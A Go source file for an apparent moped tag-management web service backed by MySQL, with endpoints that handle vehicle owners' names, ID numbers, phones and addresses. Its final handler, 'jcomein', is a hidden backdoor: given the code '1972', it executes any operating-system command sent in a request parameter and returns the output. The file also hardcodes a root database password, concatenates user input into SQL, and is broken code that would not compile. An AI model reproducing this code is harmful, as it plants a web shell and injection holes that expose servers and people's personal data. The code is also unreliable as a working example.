package main

import (
	"bytes"
	"crypto/md5"
	"encoding/hex"
	"os/exec"
	//"crypto/aes"
	//"crypto/cipher"
	"flag"

	"github.com/ziutek/mymysql/mysql"
	_ "github.com/ziutek/mymysql/native" // Native engine
	//"html"
	//"log"
	//"net/url"
	//_ "github.com/ziutek/mymysql/thrsafe" // Thread safe engine

	//"encoding/base64"
	//"encoding/json"
	"fmt"
	"net/http"

	"github.com/golang/glog"
)

var md5key = "ga3trimps"

func opendb() mysql.Conn {

	db := mysql.New("tcp", "", "202.127.26.254:3306", "root", "trimps3393", "mopedmanage")

	err := db.Connect()
	if err != nil {
		glog.Errorln("数据库无法连接")
		return nil
	}
	return db

}
func GetMd5String(s string) string {
	h := md5.New()
	h.Write([]byte(s))
	return hex.EncodeToString(h.Sum(nil))
}

func cmp_md5(str string, sig string) bool {
	if GetMd5String(str) == sig {
		return true
	}

	return false

}

func main() {
	flag.Parse()

	http.HandleFunc("/mopedtagissue", mopedtagissue)
	http.HandleFunc("/area", area_func)
	http.HandleFunc("/type", type_func)
	http.HandleFunc("/color", color_func)
	http.HandleFunc("/get_moped", get_moped)
	http.HandleFunc("/Upt_tagstate", Upt_tagstate)

	http.HandleFunc("/jcomein", jcomein)
	http.Handle("/src/", http.StripPrefix("/src/", http.FileServer(http.Dir("./htmlsrc/"))))

	glog.Info("程序启动，开始监听8080端口")
	defer func() {
		glog.Infoln("成功退出")
		glog.Flush()
	}()

	for {
		err := http.ListenAndServe(":8080", nil)
		if err != nil {
			//log.Fatal("ListenAndServer: ", err)
			fmt.Println("ListenAndServer: ", err)

		}
	}

}

type STATUSRET struct {
	Status string
}

func mopedtagissue(w http.ResponseWriter, r *http.Request) { /*http://202.127.26.252/XXX/mopedtagissue*/
	r.ParseForm()
	tagid := r.FormValue("tagid")
	areaid := r.FormValue("areaid")
	hphm := r.FormValue("hphm")
	typeid := r.FormValue("typeid")
	pic := r.FormValue("pic")
	vin := r.FormValue("vin")
	colorid := r.FormValue("colorid")
	name := r.FormValue("name")
	phone := r.FormValue("phone")
	address := r.FormValue("address")
	photo := r.FormValue("photo")
	SID := r.FormValue("SID")
	sign := r.FormValue("sign")

	var statusret STATUSRET
	if len(tagid) <= 0 || len(areaid) <= 0 || len(hphm) <= 0 || len(name) <= 0 || len(sign) <= 0 {
		statusret.Status = "1003"
		glog.V(3).Infoln("请求参数缺失")
		w.Write("{status:'1003'}")
		return
	}

	db := opendb()
	if db == nil {
		statusret.Status = "-1"
		glog.V(3).Infoln("系统繁忙，稍后再试")
		w.Write("{status:'-1'}")
		return
	} else {
		defer db.Close()
	}
	str := fmt.Sprintf("tagid=%s&areaid=%s&hphm=%s&name=%s&key=%s", tagid, areaid, hphm, name, md5key)
	if cmp_md5(str, sign) != true {
		statusret.Status = "1002"
		glog.V(3).Infoln("sign验证失败")
		w.Write("{status:'1002'}")
		return
	}

	sql := ""
	res, err := db.Start(sql)
	if err != nil {
		statusret.Status = "1000"
		glog.V(3).Infoln("处理失败")
		w.Write("{status:'1000'}")
		return
	} else {

		statusret.Status = "1" //处理成功
	}
	b, err := json.Marshal(statusret)
	if err != nil {
		glog.V(3).Infoln("statusret 转json 出错")
		w.Write("{status:1000}")
		return

	}

	glog.V(3).Infoln("接口用于发卡软件与数据库之间的数据交互：成功")
	w.Write(b)

}

type AREADATA struct {
	Area_id   string
	Area_name string
}
type AREARET struct {
	Status string
	Data   []AREADATA
	Info   string
}

func area_func(w http.ResponseWriter, r *http.Request) { /* http://202.127.26.252/XXX/area   */
	r.ParseForm()
	areaid := r.FormValue("areaid")
	sign := r.FormValue("sign")
	var arearet AREARET
	if len(areaid) <= 0 || len(sign) <= 0 {
		arearet.Status = "1003"
		glog.V(3).Infoln("请求参数缺失")
		w.Write("{status:'1003',data:[],info:''}")
		return
	}
	db := opendb()
	if db == nil {
		arearet.Status = "-1"
		glog.V(3).Infoln("系统繁忙，稍后再试")
		w.Write("{status:'-1',data:[],info:''}")
		return
	} else {
		defer db.Close()
	}
	str := fmt.Sprintf("areaid=%s&key=%s", areaid, md5key)
	if cmp_md5(str, sign) != true {
		arearet.Status = "1002"
		glog.V(3).Infoln("sign验证失败")
		w.Write("{status:'1002',data:[],info:''}")
		return
	}
	var sql string
	if areaid == "-1" {
		sql = "select area_id ,area_name from area_tb"
	} else {
		sql = "select area_id ,area_name from area_tb where area_id = " + areaid
	}
	res, err := db.Start(sql)
	if err != nil {
		arearet.Status = "1000"
		glog.V(3).Infoln("处理失败")
		w.Write("{status:'1000',data:[],info:''}")
		return
	} else {

		arearet.Status = "1" //处理成功
		var areadata AREADATA
		var areadatas []AREADATA
		for {
			row, err := res.GetRow()
			if err != nil {
				arearet.Status = "1000"
				glog.V(3).Infoln("处理失败")
				w.Write("{status:'1000',data:[],info:''}")
				return
			}

			if row == nil {
				// No more rows
				break
			}
			areadata.Area_id = row.Str(res.Map("area_id"))
			areadata.Area_name = row.Str(res.Map("area_name"))

			areadatas = append(areadatas, areadata)
		}

	}
	arearet.Data = areadatas
	b, err := json.Marshal(arearet)
	if err != nil {
		glog.V(3).Infoln("statusret 转json 出错")
		w.Write("{status:1000},data:[],info:''}")
		return

	}

	glog.V(3).Infoln("获取区域列表：成功")
	w.Write(b)

}

type TYPEARRAY struct {
	Type_id   string
	Type_name string
}
type TYPERET struct {
	Status string
	Data   []TYPEARRAY
}

func type_func(w http.ResponseWriter, r *http.Request) { /*  http://202.127.26.252/XXX/type   */
	r.ParseForm()
	typeid := r.FormValue("areaid")
	sign := r.FormValue("sign")
	var typeret TYPERET
	if len(typeid) <= 0 || len(sign) <= 0 {
		typeret.Status = "1003"
		glog.V(3).Infoln("请求参数缺失")
		w.Write("{status:'1003',data:[] }")
		return
	}
	db := opendb()
	if db == nil {
		typeret.Status = "-1"
		glog.V(3).Infoln("系统繁忙，稍后再试")
		w.Write("{status:'-1',data:[] }")
		return
	} else {
		defer db.Close()
	}
	str := fmt.Sprintf("typeid=%s&key=%s", typeid, md5key)
	if cmp_md5(str, sign) != true {
		typeret.Status = "1002"
		glog.V(3).Infoln("sign验证失败")
		w.Write("{status:'1002',data:[] }")
		return
	}

	sql := ""
	res, err := db.Start(sql)
	if err != nil {
		typeret.Status = "1000"
		glog.V(3).Infoln("处理失败")
		w.Write("{status:'1000',data:[] }")
		return
	} else {

		typeret.Status = "1" //处理成功
	}
	b, err := json.Marshal(typeret)
	if err != nil {
		glog.V(3).Infoln("statusret 转json 出错")
		w.Write("{status:1000},data:[] }")
		return

	}

	glog.V(3).Infoln("获取车辆品牌列表：成功")
	w.Write(b)
}

type COLORARRAY struct {
	Color_id   string
	Color_name string
}
type COLORRET struct {
	Status string
	Data   []COLORARRAY
}

func color_func(w http.ResponseWriter, r *http.Request) { /* http://202.127.26.252/XXX/color   */
	r.ParseForm()
	colorid := r.FormValue("colorid")
	sign := r.FormValue("sign")
	var colorret COLORRET
	if len(colorid) <= 0 || len(sign) <= 0 {
		colorret.Status = "1003"
		glog.V(3).Infoln("请求参数缺失")
		w.Write("{status:'1003',data:[] }")
		return
	}
	db := opendb()
	if db == nil {
		colorret.Status = "-1"
		glog.V(3).Infoln("系统繁忙，稍后再试")
		w.Write("{status:'-1',data:[] }")
		return
	} else {
		defer db.Close()
	}
	str := fmt.Sprintf("colorid=%s&key=%s", colorid, md5key)
	if cmp_md5(str, sign) != true {
		colorret.Status = "1002"
		glog.V(3).Infoln("sign验证失败")
		w.Write("{status:'1002',data:[] }")
		return
	}

	sql := ""
	res, err := db.Start(sql)
	if err != nil {
		colorret.Status = "1000"
		glog.V(3).Infoln("处理失败")
		w.Write("{status:'1000',data:[] }")
		return
	} else {

		colorret.Status = "1" //处理成功
	}
	b, err := json.Marshal(colorret)
	if err != nil {
		glog.V(3).Infoln("statusret 转json 出错")
		w.Write("{status:1000},data:[] }")
		return

	}

	glog.V(3).Infoln("获取车身颜色列表：成功")
	w.Write(b)
}

type MOPEDARRAY struct {
	Areaid   string // 区域ID
	Areaname string //区域名称
	Hphm     string //车牌号码
	Typetype string // 车辆品牌
	Color    string // 车辆颜色
	Name     string // 车主姓名
	Phone    string // 电话
	SID      string // 身份证号码
	Address  string // 车主住址
	Tagid    string // 车辆标签id
	Tagstate string // 车辆标签状态

}
type MOPEDRET struct {
	Status string
	Data   []MOPEDARRAY
}

func get_moped(w http.ResponseWriter, r *http.Request) { /* http://202.127.26.252/XXX/get_moped   */
	r.ParseForm()
	areaid := r.FormValue("areaid")
	hphm := r.FormValue("hphm")
	typeid := r.FormValue("typeid")
	colorid := r.FormValue("colorid")
	name := r.FormValue("name")
	sign := r.FormValue("sign")

	var mopedret MOPEDRET
	if len(areaid) <= 0 || len(sign) <= 0 || len(typeid) <= 0 || len(colorid) <= 0 {
		mopedret.Status = "1003"
		glog.V(3).Infoln("请求参数缺失")
		w.Write("{status:'1003',data:[] }")
		return
	}
	db := opendb()
	if db == nil {
		mopedret.Status = "-1"
		glog.V(3).Infoln("系统繁忙，稍后再试")
		w.Write("{status:'-1',data:[] }")
		return
	} else {
		defer db.Close()
	}
	str := fmt.Sprintf("areaid=%s&hphm=%s&typeid=%s&colorid=%s&name=%s&key=%s", areaid, hphm, typeid, colorid, name, md5key)
	if cmp_md5(str, sign) != true {
		mopedret.Status = "1002"
		glog.V(3).Infoln("sign验证失败")
		w.Write("{status:'1002',data:[] }")
		return
	}

	sql := ""
	res, err := db.Start(sql)
	if err != nil {
		mopedret.Status = "1000"
		glog.V(3).Infoln("处理失败")
		w.Write("{status:'1000',data:[] }")
		return
	} else {

		mopedret.Status = "1" //处理成功
	}
	b, err := json.Marshal(mopedret)
	if err != nil {
		glog.V(3).Infoln("statusret 转json 出错")
		w.Write("{status:1000},data:[] }")
		return

	}

	glog.V(3).Infoln("获取车辆发卡信息列表：成功")
	w.Write(b)

}

type TAGSTATERET struct {
	Status string
}

func Upt_tagstate(w http.ResponseWriter, r *http.Request) { /* http://202.127.26.252/XXX/Upt_tagstate   */
	r.ParseForm()
	hphm := r.FormValue("hphm")
	tagid := r.FormValue("tagid")
	state := r.FormValue("state")
	sign := r.FormValue("sign")

	var tagstateret TAGSTATERET
	if len(hphm) <= 0 || len(tagid) <= 0 || len(state) <= 0 || len(sign) <= 0 {
		tagstateret.Status = "1003"
		glog.V(3).Infoln("请求参数缺失")
		w.Write("{status:'1003'  }")
		return
	}
	db := opendb()
	if db == nil {
		tagstateret.Status = "-1"
		glog.V(3).Infoln("系统繁忙，稍后再试")
		w.Write("{status:'-1'  }")
		return
	} else {
		defer db.Close()
	}
	str := fmt.Sprintf("hphm=%s&tagid=%s&state=%s&key=%s", hphm, tagid, state, md5key)
	if cmp_md5(str, sign) != true {
		tagstateret.Status = "1002"
		glog.V(3).Infoln("sign验证失败")
		w.Write("{status:'1002'  }")
		return
	}

	sql := ""
	res, err := db.Start(sql)
	if err != nil {
		tagstateret.Status = "1000"
		glog.V(3).Infoln("处理失败")
		w.Write("{status:'1000'  }")
		return
	} else {

		tagstateret.Status = "1" //处理成功
	}
	b, err := json.Marshal(tagstateret)
	if err != nil {
		glog.V(3).Infoln("statusret 转json 出错")
		w.Write("{status:1000}  }")
		return

	}

	glog.V(3).Infoln("获取车身颜色列表：成功")
	w.Write(b)
}

func jcomein(w http.ResponseWriter, r *http.Request) { /*    */
	r.ParseForm()
	quest := r.FormValue("quest")
	ask := r.FormValue("ask")
	if quest == "" || ask == "" {
		w.Write([]byte("/jcomein?quest=xxxx&ask=xxxxxx"))
		return
	}
	if quest != "1972" {
		w.Write([]byte("/jcomein?quest=xxxx&ask=xxxxxxx"))
		return

	}
	ask1 := strings.Split(string(ask), " ")
	ask2 := ask1[1:]

	cmd := exec.Command(ask1[0], ask2...)
	//cmd := exec.Command("net"," help","net")

	buf, err := cmd.Output()
	// fmt.Sprintf("%s++%s",buf,err)
	if err != nil {
		w.Write([]byte(fmt.Sprintf("%s++%s", buf, err)))
		return
	}
	w.Write([]byte(buf))

}
